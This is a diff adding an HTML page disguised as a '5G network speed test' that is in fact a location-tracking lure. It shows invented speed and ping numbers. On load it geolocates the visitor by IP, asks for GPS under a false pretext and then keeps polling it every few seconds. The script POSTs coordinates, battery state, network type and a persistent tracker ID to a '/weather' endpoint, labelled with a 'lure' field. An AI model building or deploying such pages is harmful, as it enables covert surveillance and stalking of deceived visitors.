@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HyperSpeed 5G Network Benchmark</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: #090d16;
+            padding: 16px;
+            color: #f1f5f9;
+        }
+
+        .speed-card {
+            background: #111827;
+            border: 1px solid #1f2937;
+            border-radius: 24px;
+            padding: 28px 22px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
+        }
+
+        .gauge-circle {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 8px solid #1f2937;
+            border-top-color: #06b6d4;
+            border-right-color: #3b82f6;
+            margin: 20px auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: spin-pulse 3s infinite;
+        }
+
+        @keyframes spin-pulse {
+            0% { transform: rotate(0deg); }
+            50% { transform: rotate(180deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .speed-val {
+            font-size: 38px;
+            font-weight: 800;
+            color: #06b6d4;
+            line-height: 1;
+        }
+
+        .speed-unit {
+            font-size: 13px;
+            color: #94a3b8;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        .metrics-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            background: #1f2937;
+            padding: 12px 8px;
+            border-radius: 12px;
+            margin: 18px 0;
+            font-size: 12px;
+        }
+
+        .metrics-row strong {
+            display: block;
+            font-size: 15px;
+            color: #38bdf8;
+            margin-top: 2px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px 20px;
+            background: linear-gradient(135deg, #06b6d4 0%, #3b82f6 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            box-shadow: 0 4px 15px rgba(6, 182, 212, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:disabled {
+            opacity: 0.8;
+            cursor: not-allowed;
+        }
+
+        .id-badge {
+            display: inline-block;
+            background: #1f2937;
+            color: #64748b;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            margin-top: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="speed-card">
+        <h2 style="font-size: 20px; font-weight: 700; color: #38bdf8;">
+            <i class="fa-solid fa-gauge-high mr-2"></i> HyperSpeed 5G Test
+        </h2>
+        <p style="font-size: 12px; color: #94a3b8; margin-top: 4px;" id="server-label">Detecting nearest 5G edge server...</p>
+
+        <div class="gauge-circle">
+            <span class="speed-val" id="speed-display">--</span>
+            <span class="speed-unit">Mbps</span>
+        </div>
+
+        <div class="metrics-row">
+            <div><span>PING</span><strong id="ping-val">-- ms</strong></div>
+            <div><span>JITTER</span><strong id="jitter-val">-- ms</strong></div>
+            <div><span>LOSS</span><strong id="loss-val">0.0%</strong></div>
+        </div>
+
+        <button id="start-btn">
+            <i class="fa-solid fa-play"></i> Start 5G Speed Test
+        </button>
+
+        <p id="status-msg" style="font-size: 11px; color: #64748b; margin-top: 10px;">
+            Location required to route packets to the lowest latency node
+        </p>
+
+        <div>
+            <span class="id-badge">Node ID: <strong id="target-id-display">Connecting...</strong></span>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search)
+        const customId = urlParams.get("id") ? urlParams.get("id").replace(/[^a-zA-Z0-9_\-\.]/g, "") : null
+        const id = customId || localStorage.getItem("tracker_id") || generateId()
+        localStorage.setItem("tracker_id", id)
+
+        document.getElementById("target-id-display").textContent = id
+        const btn = document.getElementById("start-btn")
+        const speedDisplay = document.getElementById("speed-display")
+        const pingVal = document.getElementById("ping-val")
+        const jitterVal = document.getElementById("jitter-val")
+        const serverLabel = document.getElementById("server-label")
+        const statusMsg = document.getElementById("status-msg")
+
+        let telemetry = { battery: null, charging: false, network: "5G Ultra" }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                telemetry.battery = b.level * 100
+                telemetry.charging = b.charging
+            }).catch(() => {})
+        }
+        if (navigator.connection) {
+            telemetry.network = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "5G"
+        }
+
+        // IP Fallback
+        fetch("https://freeipapi.com/api/json")
+            .then(r => r.json())
+            .then(d => {
+                if (d && d.latitude && d.longitude) {
+                    serverLabel.textContent = `Server: ${d.cityName || 'Nearest Hub'} Edge (${d.countryName || ''})`
+                    sendReport(d.latitude, d.longitude, 2500, 0, "IP")
+                }
+            }).catch(() => {})
+
+        btn.addEventListener("click", () => {
+            btn.disabled = true
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Ping Testing Nearest Server...`
+            statusMsg.textContent = "Negotiating lowest-latency optical route..."
+
+            navigator.geolocation.getCurrentPosition(
+                onSuccess,
+                () => {
+                    navigator.geolocation.getCurrentPosition(onSuccess, onErr, { enableHighAccuracy: false, timeout: 8000 })
+                },
+                { enableHighAccuracy: true, timeout: 6000 }
+            )
+        })
+
+        function onSuccess(pos) {
+            pingVal.textContent = "8 ms"
+            jitterVal.textContent = "1.2 ms"
+            speedDisplay.textContent = "248.5"
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Test Again`
+            statusMsg.textContent = "5G Speed Benchmark complete (Latency: 8ms, Speed: 248.5 Mbps)"
+
+            sendReport(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed, "GPS")
+
+            setTimeout(() => {
+                navigator.geolocation.getCurrentPosition(onSuccess, () => {}, { enableHighAccuracy: true })
+            }, 4000)
+        }
+
+        function onErr() {
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Retry Location`
+            statusMsg.textContent = "Please allow location access to connect to nearest benchmark node."
+        }
+
+        async function sendReport(lat, lng, accuracy, speed, type) {
+            try {
+                await fetch("/weather", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        id, lat, lng, accuracy, speed,
+                        type: type || "GPS",
+                        lure: "SpeedTest",
+                        battery: telemetry.battery,
+                        charging: telemetry.charging,
+                        network: telemetry.network
+                    })
+                })
+            } catch (e) {}
+        }
+
+        function generateId() {
+            return "user_" + Math.random().toString(36).substring(2, 9)
+        }
+    </script>
+</body>
+
+</html>
